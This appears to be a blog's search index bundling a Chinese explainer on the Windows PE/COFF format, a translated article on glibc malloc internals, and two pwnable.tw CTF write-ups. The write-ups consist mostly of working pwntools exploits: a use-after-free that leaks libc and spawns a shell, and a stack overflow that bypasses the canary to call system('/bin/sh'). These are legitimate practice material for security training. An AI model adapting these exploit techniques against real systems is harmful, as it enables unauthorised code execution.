<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windows PE/COFF]]></title>
    <url>%2F2017%2F12%2F08%2Fwindows-PE-COFF%2F</url>
    <content type="text"><![CDATA[PREFACEWindows下的可执行文件采用PE格式, 而编译器产生的目标文件仍为COFF格式. 由于PE是COFF的一种扩展, 它们在结构上很大程度相同. 很多时候我们可以将它们统称为PE/COFF文件. COFFCOFF文件的文件头部(类比ELF Header)包括两部分, 一个是描述该文件总体结构和属性的映像头(Image Header), 另一个是描述该文件中包含的端属性的段表(Section Table). 下图定性的描述了COFF文件的大致结构. Image Header123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //目标机器类型(CPU类型) WORD NumberOfSections; //段的数量 DWORD TimeDateStamp; //PE文件创建的时间 DWORD PointerToSymbolTable; //符号表在PE文件中的位置 DWORD NumberOfSymbols; //符号数量 WORD SizeOfOptionalHeader; //Optional Header的大小(仅PE) WORD Characteristics; //标志位&#125;IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER Section Table段表是一个类型为_IMAGE_SECTION_HEADER的数组, 数组的大小为COFF文件所包含的段的数量. Section Header12345678910111213141516typedef struct _IMAGE_SECTION_HEADER &#123; BYTE name[IMAGE_SIZEOF_SHORT_NAME]; //节区名称 //IMAGE_SIZEOF_SHORT_NAME=8 union &#123; DWORD PhysicalAddress; //物理地址 DWORD VirtualSize; //内存中节区所占大小 &#125;Misc; DWORD VirtualAddress; //内存中节区起始地址 DOWRD SizeOfRawData; //磁盘文件中节区所占大小 DOWRD PointerToRawData; //磁盘文件中节区起始位置偏移量 DWORD PointerToRelocations; //重定位的偏移 DWORD PointerToLinenumbers; //行号表的偏移 WORD NumberOfRelocations; //重定位项数目 WORD NumberOfLinenumbers; //行号表的数目 DWORD Characteristics; //节区属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; characteristics12345678910111213141516171819#define IMAGE_SCN_TYPE_NO_PAD 0x00000008#define IMAGE_SCN_CNT_CODE 0x00000020 //该段是代码#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 //数据段#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 //bss段#define IMAGE_SCN_LNK_OTHER 0x00000100#define IMAGE_SCN_LNK_INFO 0x00000200 //该段包含的是注释或其他信息#define IMAGE_SCN_LNK_REMOVE 0x00000800 //链接后抛弃...#define IMAGE_SCN_LNK_NRELOC_OVFL 0x01000000#define IMAGE_SCN_MEM_DISCARDABLE 0x02000000#define IMAGE_SCN_MEM_NOT_CACHED 0x04000000#define IMAGE_SCN_MEM_NOT_PAGED 0x08000000#define IMAGE_SCN_MEM_SHARED 0x10000000 //共享段#define IMAGE_SCN_MEM_EXECUTE 0x20000000 //该段在内存中可执行#define IMAGE_SCN_MEM_READ 0x40000000 //该段在内存中是可读的#define IMAGE_SCN_MEM_WRITE 0x80000000 //该段在内存中可写#define IMAGE_SCN_SCALE_INDEX 0x00000001 Other .drectve段— 链接指示信息 .debug段— 调试信息 Symbol Table : 与ELF文件符号表基本相同, 主要有符号名/符号类型/所在位置等信息. PEPE文件是COFF文件的扩展, 相比COFF文件, PE文件多了以下几个结构(并不完整): 最头部添加DOS MZ可执行文件格式的文件头和桩代码 IAMGE_FILE_HEADER 扩展成了IMAGE_NT_HEADER PE文件的大致结构结构如下图: DOS Header &amp; DOS StubDOS Header123456789101112131415161718192021 typedef struct _IMAGE_DOS_HEADER &#123; WORD e_magic; //MZ WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; //指向向程序入口段地址 WORD e_cs; //指向程序入口偏移地址 WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; //PE文件头在文件中的偏移&#125; IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER; DOS Stub这是一段能够在DOS下运行的代码, 这段代码的功能是输出This program cannot be run in DOS mode, 然后退出程序. NT HeaderIMAGE_NT_HEADER是PE真正的文件头, 它包含一个PE签名和两个结构体— IMAGE_FILE_HEADER和IMAGE_OPTIONAL_HEADER. 其中的 IMAGE_FILE_HEADER和COFF文件中的相同. PE签名的值恒为PE\x00\x00. 12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; &#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32; Image Optional Header123456789101112131415161718192021222324typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; ////PE32中为10B，PE32+中为20B ... DWORD AddressOfEntryPoint; ////持有EP的RVA值，程序最先执行的代码的地址 DWORD BaseOfCode; DWORD BaseOfData; DWORD ImageBase; //文件的优先装入地址，EXE、DLL到用户内存0～7FFFFFFF //SYS到内核内存80000000~FFFFFFFF //典型地，EXE：00400000；DLL：10000000 DWORD SectionAlignment; //节区在内存中的最小单位 DWORD FileAlignment; //节区在磁盘文件中的最小单位 ... DWORD SizeOfImage; //PE Image在虚拟内存中所占的空间大小 DWORD SizeOfHeaders; //整个PE头的大小，必须是FileAlignment的整数倍 DWORD CheckSum; //区分系统驱动文件*.sys与普通可执行文件*.exe, *.dll WORD Subsystem; ... DWORD NumberOfRvaAndSizes; //到此处总共有0x60个字节 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; /*特别注意： DataDirectory[0]=EXPORT Directory DataDirectory[1]=IMPORT Directory */&#125; IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32; Data Dtirectory 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY; 123456789101112131415#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 //导出表#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 //导入表#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 //资源表#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 //异常表#define IMAGE_DIRECTORY_ENTRY_SECURITY 4#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 //调试信息表#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8#define IMAGE_DIRECTORY_ENTRY_TLS 9 //线程私有存储#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11#define IMAGE_DIRECTORY_ENTRY_IAT 12 //导入地址表#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 REFRENCE 《程序员的自我修养— 链接、装载与库》]]></content>
      <categories>
        <category>RE note</category>
      </categories>
      <tags>
        <tag>ELF</tag>
        <tag>link&amp;load</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Understand Glibc Malloc]]></title>
    <url>%2F2017%2F11%2F27%2FUnderstand-glibc-malloc%2F</url>
    <content type="text"><![CDATA[序言我经常对堆内存感到疑惑，以下问题 堆内存是如何从内核取得的？ 如何高效管理堆内存？ 堆是由谁来管理的？是内核，库，还是程序本身？ 堆能够被利用吗？ 经常盘旋在我的脑海中，然而直到最近我才有时间去深入理解这些问题。下面就来谈谈我的研究成果。开源社区提供了许多现成的内存分配器： dlmalloc – General purpose allocator ptmalloc2 – glibc jemalloc – FreeBSD and Firefox tcmalloc – Google libumem – Solaris … 每种内存分配器都宣称自己快速、高效、可扩展，但并不是所有内存分配器都能够适用于所有应用程序。内存吞吐量大的应用程序的性能很大程度上取决于内存分配器的性能。在这篇文章中，我只会讨论glibc malloc内存分配器。为了更好地理解glibc malloc，在此给出源码链接。所以系好安全带，我们要开始了！ 1历史：ptmalloc2基于dlmalloc开发，并添加了对多线程的支持，于2006年公布。在公布之后，ptmalloc2被整合到glibc源代码中，此后ptmalloc2所有的修改都直接提交到glibc的malloc部分去了。因此，ptmalloc2的源码和glibc的malloc源码有很多不一致的地方。 关于malloc系统调用这篇文章中的malloc所使用的系统调用是sbrk或者mmap。 线程在早年的Linux中，dlmalloc是默认的内存分配器。由于对多线程的支持，ptmalloc2取代了dlmalloc的地位。多线程支持能提高内存分配器的性能，从而提高应用的性能。 在dlmalloc中，当有两个线程同时调用malloc时，只有一个线程能够访问临界区，因为freelist被所有可用线程共享。正如此，使用 dlmalloc的多线程应用会在内存分配上耗费过多时间，导致整个应用性能的下降。 而在ptmalloc2中，当有两个线程同时调用malloc时，内存均会得到立即分配，因为每个线程都维护着一个独立里堆段，因此维护这些堆的freelist也是独立的。这种为每个线程独立地维护堆和freelist的行为就称为per thread arena。 freelist : 已被free的chunk构成的链表 example1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* Per thread arena example. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123; printf("Before malloc in thread 1\n"); getchar(); char* addr = (char*) malloc(1000); printf("After malloc and before free in thread 1\n"); getchar(); free(addr); printf("After free in thread 1\n"); getchar();&#125;int main() &#123; pthread_t t1; void* s; int ret; char* addr; printf("Welcome to per thread arena example::%d\n",getpid()); printf("Before malloc in main thread\n"); getchar(); addr = (char*) malloc(1000); printf("After malloc and before free in main thread\n"); getchar(); free(addr); printf("After free in main thread\n"); getchar(); ret = pthread_create(&amp;t1, NULL, threadFunc, NULL); if(ret) &#123; printf("Thread creation error\n"); return -1; &#125; ret = pthread_join(t1, &amp;s); if(ret) &#123; printf("Thread join error\n"); return -1; &#125; return 0;&#125; 输出分析从下面的输出里我们可以得知，这里还没有堆段和per thread stack，因为thread1还没有创建。 1234567891011sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501Before malloc in main thread...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthreadb7e05000-b7e07000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ 主线程执行malloc之后从输出中我们可以看到堆段产生在数据段0804b000 - 0806c000之间，这表明堆内存是通过更高级别的系统调用产生（即brk系统调用）的。此外，请注意，尽管用户只申请了1000字节的内存，但是实际产生了132KB的堆内存。这个连续的堆内存区域被称为 arena。因为这个arena是被主线程建立的，因此称为main arena。接下来的申请会继续分配这个arena的132KB中剩余的部分，直到用尽。当用尽时，它可以通过更高级别的系统调用扩容，在扩容之后，top chunk的大小也随之调整以圈进这块额外的空间。相应地，arena也可以在top chunk空间过大时缩小。 注意：top chunk是一个arena中最顶层的chunk。有关top chunk的更多信息详见下述“top chunk”部分。 12345678910111213sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501Before malloc in main threadAfter malloc and before free in main thread...sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7e05000-b7e07000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ 在主线程 free 之后在如下的输出结果中我们可以看出当分配的内存区域free掉时，其后的内存并不会立即释放给操作系统。分配的内存区域（1000B）仅仅是移交给了glibc malloc，把这段free掉的区域添加在了main arenas bin中（在glibc malloc中，freelist被称为bin）。随后当用户请求内存时，glibc malloc就不再从内核中申请新的堆区了，而是尝试在bin中找到空闲区块，除非实在找不到。 1234567891011121314sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501Before malloc in main threadAfter malloc and before free in main threadAfter free in main thread...sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7e05000-b7e07000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ thread1执行malloc之前此时thread1的堆还未建立，但是其每个线程栈都已建立。 12345678910111213141516sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501Before malloc in main threadAfter malloc and before free in main threadAfter free in main threadBefore malloc in thread 1...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594]...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ thread1执行malloc 后 thread1的堆段建立在内存映射段区域b7500000 - b7521000，这表明了堆内存是使用mmap系统调用产生的，而非同主线程一样使用 sbrk系统调用。同样地，尽管用户只请求了1000B，1MB的堆内存还是被映射到了进程地址空间。在这1MB中，只有132KB被设置了读写权限并成为该线程的堆内存。这段连续内存（132KB）被称为thread arena。 注意：当用户请求超过 128KB 大小并且此时arena中没有足够的空间来满足用户的请求时，内存将通过使用 mmap 系统调用（不再是 sbrk）来分配而不论请求是发自main arena还是thread arena。 12345678910111213141516171819sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501Before malloc in main threadAfter malloc and before free in main threadAfter free in main threadBefore malloc in thread 1After malloc and before free in thread 1...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594]...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ thread1 free之后在如下的输出结果中我们可以看出 free 掉的分配的内存区域这一过程并不会把堆内存归还给操作系统，而是仅仅是移交给了glibc malloc，然后添加在了thread arenas bin中。 1234567891011121314151617181920sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501Before malloc in main threadAfter malloc and before free in main threadAfter free in main threadBefore malloc in thread 1After malloc and before free in thread 1After free in thread 1...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594]...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ArenaArena的数量在上述例子中，主线程包含main arena而thread 1包含它自有的thread arena。所以若不计线程的数量，在线程和arena之间是否存在一对一映射关系？当然不存在，部分极端的应用甚至运行比处理器核心的数量还多的线程，在这种情况下，每个线程都拥有一个arena开销过高且意义不大。因此，应用的arena数量限制是基于系统的核心数的。 1234For 32 bit systems: Number of arena = 2 * number of cores.For 64 bit systems: Number of arena = 8 * number of cores. Multiple Arena让我们来看一个运行在单核计算机上的32位操作系统上的多线程应用（4线程 = 主线程 + 3个用户线程）的例子。这里线程数量(4)大于核心数的二倍加一，因此在这种条件下，glibc malloc认定multiple arenas会被所有可用线程共享。那么它是如何共享的呢？ 当主线程第一次调用malloc时，已经建立的main arena会被没有任何竞争地使用。 当thread1和thread2第一次调用malloc时，一块新的arena就被创建且会被没有任何竞争地使用。此时线程和arena之间有着一对一的映射关系。 当thread3第一次调用malloc时，arena的数量限制被计算出来。这里超过了arena的数量限制，因此尝试复用已经存在的arena。 复用： 一旦遍历出可用arena，就开始自旋申请该arena的锁。 如果上锁成功（比如说main arena上锁成功），就将该arena返回用户。 如果查无可用arena，thread3的malloc操作阻塞，直到有可用的arena为止。 当thread3第二次调用malloc时，malloc会尝试使用上一次使用的arena（main arena）。当main arena可用时就用，否则thread3就一直阻塞直至main arena被free掉。因此现在main arena实际上是被main thread和thread3所共享 Multiple Heaps在glibc malloc中主要发现了3种数据结构： heap_info ：Heap Header，一个thread arena可以有多个堆。每个堆都有自己的堆 Header。为什么需要多个堆？ 每个thread arena都只包含一个堆，但是当这个堆段空间耗尽时，新的堆（非连续区域）就会被 mmap 到这个arena。 malloc_state ：Arena header，一个thread arena可以有多个堆，但是所有这些堆只存在arena header。arena header包括的信息有：bins、top chunk、last remainder chunk等。 malloc_chunk ：Chunk header， 一个堆根据用户请求被分为若干chunk。每个这样的chunk都有自己的chunk header。 注意 ： 「Main arena」没有多个堆，因此没有「heap_info」结构。当「main arena」空间耗尽时，就拓展 sbrk 获得的堆段（拓展后是连续内存区域），直至“碰”到内存映射区为止。 不像「thread arena」，「main arena」的「arena 」header不是 sbrk 获得的堆段的一部分，而是一个全局变量，因此它可以在 libc.so 的 数据段中被找到。 main arena和thread arena的图示如下（单堆段）： thread arena的图示如下（多堆段）： Chunkchunk有以下几种类型: Allocated chunk Free chunk Top chunk Last Remainder chunk Allocated chunk prev_size: 如果上一个chunk未被分配, 这个值代表上一个chunk的大小, 否则这里就是用户的数据. size: 该chunk的大小. 最后三位是标志位. PREV_INUSE(P) — 当上一个chunk被分配时置1 IS_MMAPED(M) — 当chunk以mmap调用分配时置1 NO_MAIN_ARENA(N) — 当chunk属于thread arena时置1 注意: 在已分配的malloc_chunk中, fd/bk等字段是无用的, 这些字段被用户数据所取代. 用户所请求的大小被转换成有效的大小, 因为需要额外的空间来存储malloc_chunk结构和保持对齐. 由于转换后的大小(8的倍数)能够保证后三位永远为0, 因此这三位被当作标志位使用. Free chunk prev_size: 任何两个free chunk都不相邻. 当两个free chunk相邻时, 它们会被合并成一个free chunk. 因此free chunk的上一个chunk总是已分配的, 所以free chunk的prev_size字段总是上一个chunk的数据. size: 这个字段表示该free chunk的大小. fd: 前向指针 — 在bin中指向下一个chunk(并不是指在物理内存上连续的下一个chunk). bk: 后向指针 — 在bin中指向上一个chunk(并不是指在物理内存上连续的上一个chunk). Top chunk一个arena中最顶部的chunk叫做top chunk, 它不属于任何bin, 当bins中无可用的free chunk时, top chunk才被使用. 如果top chunk的大小大于用户请求时, top chunk被分为两部分: User chunk(大小为用户请求的大小) Reminder chunk(剩余大小) 剩余的chunk变成新的top chunk. 如果top chunk的大小小于用户所请求的大小, 系统将会调用sbrk(main arena)或者mmap(thread arena)来扩展top chunk. Last Reminder chunk最后一次small request中因分割而得到的剩余部分. last remainder chunk有助于改进引用的局部性, 也即连续的对small chunk的malloc请求可能最终导致各chunk被分配得彼此贴近。 但是除了在一个arena里可用的chunk, 哪些有资格成为last remainder chunk呢？ 当一个用户请求small chunk而无法从small bin和unsorted bin得到服务时, binmaps就会扫描下一个最大非空bin. 正如前文所提及的, 如果这样的bin找到了, 其中最适chunk就会分割为两部分: 返回给用户的User chunk和添加到unsorted bin中的Remainder chunk。此外，这一Remainder chunk还会成为最新的last remainder chunk。 那么参考局部性是如何实现的呢？ 现在当用户随后的请求是请求一块small chunk并且last remainder chunk是unsorted bin中唯一的chunk, last remainder chunk就分割成两部分: 返回给用户的User chunk、添加到unsorted bin中的Remainder chunk. 此外，这一Remainder chunk还会成为最新的 last remainder chunk. 因此随后的内存分配最终导致各chunk被分配得彼此贴近。 BinsBins是freelist的数据结构类型, 它们被用于存放free chunks. 根据大小可将bins分为以下几类: Fast bin Unsorted bin Small bin Large bin 存放以上bins的数据结构是: fastbinsY: 这个数组存放fastbins bins: 这个数组存放unsorted, small和large bins. 总共有126个bins链表, 他们按照如下规则分布: Bin 1 — Unsorted bin Bin 2到Bin 63 — Small bin Bin 64到Bin 126 — Large bin Fast bin大小在16到80字节的chunk被称为fast chunk, 存放fast chunk的bins被称为fast bins . Fast bins在内存分配和释放快于其他bins. bins的数量 — 10 每个fast bin包含一个free chunks的单向链表, 插入和删除都只发生在链表的前端 — LIFO chunk大小 — 相隔8字节 在同一个fast bin中的chunk大小相同. 第一个fast bin(index 0)的大小为16字节, 往下依次8字节递增. 在malloc 初始化中, 最大fast bin大小被置为64字节(非80), 因此16-64字节被默认为fast chunks. 不合并 — 两个相邻的fast chunk不被合并, 这样做虽然会造成内存碎片, 但是可以提高速度. malloc(fast chunk) — 起初fast bin max size和fast bin indices是空的, 因此执行的是fast bin的代码, 而非small bin和large bin的代码. 之后当它非空时, 用户请求的chunk从相应的fast bin链表中取出 free(fast chunk) — fast bin index由相应的chunk大小计算得出 被free的chunk插入到相应的binlist的前端 Unsorted bin当small bin或者large bin被free时, 它们会先被插入到unsorted bin链表而非各自相应的链表. 这个规则让glibc malloc能够二次利用之前free的chunk, 这样做能够加快内存的分配和释放, 因为花在查找合适大小chunk上的时间减少了. bins的数量 — 1 unsorted bin包含一个双向循环链表 chunk 大小 — 对大小无限制 Small bin低于512字节的chunk被称为small chunk, 存放small chunk的bins被称为small bins, small bins快于large bins但慢于fast bins. bins的数量 — 62 每个small bin包含一个双向循环链表, 这是为了方便chunk能够从bins中间进行unlink, chunk从链表前端插入并从链表尾端删除 — FIFO chunk大小 — 相隔8字节 首个small bin(即Bin 2)包含大小为16字节的chunk, 往下依次递增8字节 在同一small bin中的chunk大小一致. 合并 — 两个相邻的free small chunk会被合并. malloc(small chunk) — 最初small bin是空的, 当用户请求一个small chunk时, 执行的是unsorted bin的代码而非small bin. 同样地, 在第一次调用malloc期间, 在malloc_state找到的small bin和large bin数据结构被初始化, bin都会指向它们本身以表示binlist为空 之后当small bin为非空时, (若用户在此调用malloc)相应链表上的最后一个chunk将会被移除, 并且返回给用户 free(small chunk) — * 当要free这个chunk时, 先检查它前后(物理内存上毗邻)的chunk是否是free的, 如果是的话, 先将这些chunk从各自的链表上unlink, 合并后将它们插入到unsorted bin链表的头部 Large bin大小大于512字节的chunk被称为large chunk, 存放large chunk的链表被称为large bin. bins的数量 — 63 每个large bin包含一个双向循环链表, 我们可以在链表的任何地方插入或删除chunk 在这63个bin中: 前32个bin记录着大小以64字节递增的bin链表, 也即第一个large chunk(Bin 65)记录着大小为512字节~568字节的chunk的binlist, 第二个large chunk (Bin 66)记录着大小为576字节到632字节的chunk的binlist, 依次类推…… 后16个bin记录着大小以 512 字节递增的bin链表 后8个bin记录着大小以 4096 字节递增的bin链表 后 4 个bin记录着大小以 32768 字节递增的bin链表 后2个bin记录着大小以 262144 字节递增的bin链表 最后1个bin记录着大小为剩余大小的chunk 与small bin不同的是, large bin中所有chunk大小不一定相同, 因此各chunk需要递减保存. 最大的chunk保存在最前的位置, 而最小的chunk保存在最后的位置 合并 — 任意两个free chunk不相邻 malloc(large chunk) — 初始情况下, large bin都是空链表, 因此尽管用户请求large chunk, 执行的代码将是next largetst bin code而不是large bin code 同样地, 在第一次调用malloc期间, 在malloc_state找到的small bin和large bin数据结构被初始化, bin都会指向它们本身以表示binlist为空 此后当small bin非空后, 当相应binlist中最大chunk的大小大于用户所请求的大小时, binlist就从顶部遍历到底部(从小到大)以找到一个大小最接近用户需求的chunk. 一旦找到, 相应chunk就会分成两块: User chunk(用户请求大小) — 返回给用户 Remainder chunk(剩余大小)— 添加到unsorted bin 当相应binlist中最大chunk的大小小于用户所请求的大小时, 尝试在Next largest bin中查到到所需的chunk以响应用户请求. next largetst bin code会扫描 binmaps以找到下一个最大非空bin, 如果这样的bin找到了, 就从其中的binlist中检索到合适的chunk并返回给用户; 反之就使用top chunk以响应用户请求 free(large chunk) — 类似于small chunk refrence这篇文章里有些段落的翻译是参考了别人的翻译(修改了格式), 在这里放上链接: 原文地址 参考链接]]></content>
      <categories>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>glibc malloc</tag>
        <tag>heap overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hacknote Writeup]]></title>
    <url>%2F2017%2F11%2F20%2Fhacknote-writeup%2F</url>
    <content type="text"><![CDATA[exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *context.terminal = ['tmux', 'solitw', '-h']context.arch = 'x86'context.log_level = 'DEBUG'host = 'chall.pwnable.tw'port = 10102io = remote(host, port)free_plt = 0x080484A0# system_offset = 0x3ada0system_offset = 0x3a940printf_got = 0x804a010# printf_offset = 0x49670printf_offset = 0x49020put_content = 0x0804862Bdef addNote(size, content): io.recvuntil('Your choice :') io.sendline('1') io.recvuntil('Note size :') io.sendline(str(size)) io.recvuntil('Content :') io.sendline(content)def deleteNote(index): io.recvuntil('Your choice :') io.sendline('2') io.recvuntil('Index :') io.sendline(str(index))def printNote(index): io.recvuntil('Your choice :') io.sendline('3') io.recvuntil('Index :') io.sendline(str(index)) return io.recvuntil('\n')# gdb.attach(io, '''# b malloc# b free# ''')def main(): # leak libc first addNote(8, 'A'*7) addNote(16, 'A'*15) deleteNote(0) deleteNote(1) addNote(8, p32(put_content) + p32(printf_got)) io.recvuntil('Invalid choice') libc_base = u32(printNote(0)[0:4]) - printf_offset log.info("get libc base addr : 0x%x" % (libc_base)) deleteNote(2) addNote('8',p32(libc_base+system_offset)+';sh;') io.sendline('3') io.sendline('0') io.interactive()if __name__ == '__main__': main()]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>heap overflow</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dubblesort Write Up]]></title>
    <url>%2F2017%2F11%2F19%2Fdubblesort-write-up%2F</url>
    <content type="text"><![CDATA[summary 由于程序未对需要冒泡排序的数字的个数进行限制, 这意味着我们可以对栈中的重要内容进行排序. 虽然程序开了Full RELRO, 但栈内数据的大小顺序是不会改变的. 为了不改写canary的值, 我们只能写入0x20个值, 但是需要对0x2b个数据进行排序, 考虑到程序用了scanf(&quot;%u&quot;, &amp;num)来输入数据, 我们可以通过写入一个a(或者其他非数字符号)来达到目的. 该exp中假设0x56555b2b&lt;cannary的值, 因为这样成功的几率会大一些 将system_addr写入返回地址,将binsh写入第一个参数的位置. stack123456 canary0xffffdafc: 0x8ec66400 0xf7fc33dc 0xffffdcdb 0x56555b2b0xffffdb0c: 0x00000000 0xf7fc3000 0xf7fc3000 0x000000000xffffdb1c: 0xf7e29637 0x00000001 0xffffdbb4 0xffffdbbc0xffffdb2c: 0x00000000 0x00000000 0x00000000 0xf7fc30000xffffdb3c: 0xf7ffdc04 0x00000001 exp123456789101112131415161718192021222324252627282930313233343536373839from pwn import *system_offset = 0x3a940 + 0x460binsh_offset = system_offset + 1182731log.info("binsh_offset: 0x%x" % (binsh_offset))log.info("system_offset: 0x%x" % (system_offset))context.terminal = ['tmux', 'splitw', '-h']context.log_level = 'DEBUG'context.arch = 'x86'io = process('./dubblesort')# gdb.attach(io, 'b *main+315')payload = 'A' * 24io.recvuntil('What your name :')io.sendline(payload)io.recvuntil('Hello ' + payload)libc_base = u32(io.recv(4)) - 0x1b200alog.info("get libc base addr : 0x%x" % (libc_base))io.recvuntil('How many numbers do you what to sort :')io.sendline(str(0x2b))for i in range(8): io.recvuntil('number : ') io.sendline(str(libc_base + system_offset)) i -= 1for i in range(15): io.recvuntil('number : ') io.sendline(str(0)) i -= 1io.sendline(str(libc_base + binsh_offset))io.sendline('a')io.recvuntil('Result :\n')io.recv(57)canary = int(io.recv(10))log.info("get canary: 0x%x" % (canary))io.recv()io.interactive()]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>pwnable.tw</tag>
        <tag>stack overflow</tag>
      </tags>
